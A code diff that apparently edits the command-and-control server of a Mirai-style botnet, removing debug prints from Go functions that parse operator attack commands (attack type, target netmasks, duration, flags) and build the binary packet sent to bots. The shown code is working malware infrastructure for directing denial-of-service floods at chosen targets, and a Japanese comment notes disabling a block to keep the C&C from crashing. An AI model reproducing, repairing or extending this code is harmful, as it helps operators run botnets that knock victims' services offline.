@@ -200,36 +200,29 @@ func uint8InSlice(a uint8, list []uint8) bool {
 }
 
 func NewAttack(str string, admin int) (*Attack, error) {
-    fmt.Println("[attack] Newattack start")
     atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
     args, _ := shellwords.Parse(str)
 
     var atkInfo AttackInfo
-    fmt.Println("[attack]Parse attack name")
     // Parse attack name
     if len(args) == 0 {
-        fmt.Println("[attack]arg=0")
         return nil, errors.New("Must specify an attack name")
     } else {
         if args[0] == "?" {
-            fmt.Println("[attack]?")
             validCmdList := "\033[37;1mAvailable attack list\r\n\033[36;1m"
             for cmdName, atkInfo := range attackInfoLookup {
                 validCmdList += cmdName + ": " + atkInfo.attackDescription + "\r\n"
             }
             return nil, errors.New(validCmdList)
         }
-        fmt.Println("[attack]attackInfoLookup")
         var exists bool
         atkInfo, exists = attackInfoLookup[args[0]]
         if !exists {
-            fmt.Println("[attack]attackInfoLookup return")
             return nil, errors.New(fmt.Sprintf("\033[33;1m%s \033[31mis not a valid attack!", args[0]))
         }
         atk.Type = atkInfo.attackID
         args = args[1:]
     }
-    fmt.Println("[attack]Parse targets.args=",args)
     // Parse targets
     if len(args) == 0 {
         return nil, errors.New("Must specify prefix/netmask as targets")
@@ -267,7 +260,6 @@ func NewAttack(str string, admin int) (*Attack, error) {
         }
         args = args[1:]
     }
-    fmt.Println("[attack]Parse attack duration time")
     // Parse attack duration time
     if len(args) == 0 {
         return nil, errors.New("Must specify an attack duration")
@@ -282,7 +274,6 @@ func NewAttack(str string, admin int) (*Attack, error) {
         atk.Duration = uint32(duration)
         args = args[1:]
     }
-    fmt.Println("[attack]Parse flags")
     // Parse flags
     for len(args) > 0 {
         if args[0] == "?" {
@@ -307,11 +298,6 @@ func NewAttack(str string, admin int) (*Attack, error) {
         if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) || (admin == 0 && flagInfo.flagID == 25) {
             return nil, errors.New(fmt.Sprintf("Invalid flag key %s, near %s", flagSplit[0], args[0]))
         }
-	//panic 誤入力によるパニックによるC＆Cの実行中断防止のためのコメントアウト
-        /*if flagSplit[1][0] == '"' {
-            flagSplit[1] = flagSplit[1][1:len(flagSplit[1]) - 1]
-            fmt.Println(flagSplit[1])
-        }*/
         if flagSplit[1] == "true" {
             flagSplit[1] = "1"
         } else if flagSplit[1] == "false" {
@@ -323,7 +309,6 @@ func NewAttack(str string, admin int) (*Attack, error) {
     if len(atk.Flags) > 255 {
         return nil, errors.New("Cannot have more than 255 flags")
     }
-    fmt.Println("[attack]NewAttack finish")
     return atk, nil
 }
 
@@ -331,18 +316,14 @@ func (this *Attack) Build() ([]byte, error) {
     buf := make([]byte, 0)
     var tmp []byte
 
-    fmt.Println("[attack]build start")
     // Add in attack duration
     tmp = make([]byte, 4)
     binary.BigEndian.PutUint32(tmp, this.Duration)
     buf = append(buf, tmp...)
-    fmt.Println("[attack]333:build buf:",buf)
     // Add in attack type
     buf = append(buf, byte(this.Type))
-    fmt.Println("[attack]336:build buf:",buf)
     // Send number of targets
     buf = append(buf, byte(len(this.Targets)))
-    fmt.Println("[attack]339:build buf:",buf)
     // Send targets
     for prefix,netmask := range this.Targets {
         tmp = make([]byte, 5)
@@ -350,7 +331,6 @@ func (this *Attack) Build() ([]byte, error) {
         tmp[4] = byte(netmask)
         buf = append(buf, tmp...)
     }
-    fmt.Println("[attack]347:build buf:",buf)
     // Send number of flags
     buf = append(buf, byte(len(this.Flags)))
 
@@ -366,7 +346,6 @@ func (this *Attack) Build() ([]byte, error) {
         tmp = append(tmp, strbuf...)
         buf = append(buf, tmp...)
     }
-    fmt.Println("[attack]363:build buf:",buf)
     // Specify the total length
     if len(buf) > 4096 {
         return nil, errors.New("Max buffer is 4096")
@@ -374,6 +353,5 @@ func (this *Attack) Build() ([]byte, error) {
     tmp = make([]byte, 2)
     binary.BigEndian.PutUint16(tmp, uint16(len(buf) + 2))
     buf = append(tmp, buf...)
-    fmt.Println("[attack]333:build finish buf:",buf)
     return buf, nil
 }
